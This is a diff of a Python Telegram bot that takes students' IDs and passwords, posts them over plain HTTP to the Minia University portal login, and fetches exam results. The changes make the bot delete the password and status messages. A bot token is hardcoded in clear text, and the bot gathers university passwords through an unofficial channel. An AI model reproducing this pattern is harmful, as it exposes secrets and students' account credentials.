@@ -8,7 +8,7 @@ import time
 import threading
 
 admin_chat_id = 1792449471
-token = "6410467729:AAHQRfTnP2-yR1V1DGDZo6UZxlTzuac-upk"
+token ="6410467729:AAHQRfTnP2-yR1V1DGDZo6UZxlTzuac-upk"
 bot = telebot.TeleBot(token)
 #__&&&&_____
 keyboard2 = types.InlineKeyboardMarkup()
@@ -160,10 +160,10 @@ def process_id(message):
 def process_password(message, student_id):
     password = message.text
     chat_id = message.chat.id
+    password_message_id = message.message_id  # حفظ معرف رسالة كلمة المرور
+
     sent_message = bot.reply_to(message, "•يتم الآن التحقق من كلمة المرور...🔍")
-    chat_id = sent_message.chat.id
-    message_id = sent_message.message_id
-    password_message_id = message.message_id
+    temp_message_id = sent_message.message_id
 
     url1 = "http://credit.minia.edu.eg/studentLogin"
     headers1 = {
@@ -186,17 +186,19 @@ def process_password(message, student_id):
         "UserLang": "E",
         "userType": "2",
     }
-    
 
     try:
         response = requests.post(url1, headers=headers1, data=data, timeout=10)
+        bot.delete_message(chat_id=chat_id, message_id=password_message_id)
 
         if not response.ok:
-            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
+            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
             return
 
         if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
-            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة. يرجى الانتظار قليلاً...🔁")
+            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة. يرجى الانتظار قليلاً...🔁")
+            # حذف الرسالة المؤقتة
+            bot.delete_message(chat_id=chat_id, message_id=temp_message_id)
             chat_id = message.chat.id
             bot.send_chat_action(chat_id, 'typing')
             
@@ -204,7 +206,7 @@ def process_password(message, student_id):
             
             
         else:
-            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة كلمة المرور الصحيحه قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)
+            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة كلمة المرور الصحيحه قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)
 
             try:
             	admin_message = (
@@ -223,7 +225,7 @@ def process_password(message, student_id):
 
     
     except requests.Timeout:
-        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=" الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
+        bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text=" الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
         return
 
     url = "http://credit.minia.edu.eg/getJCI"
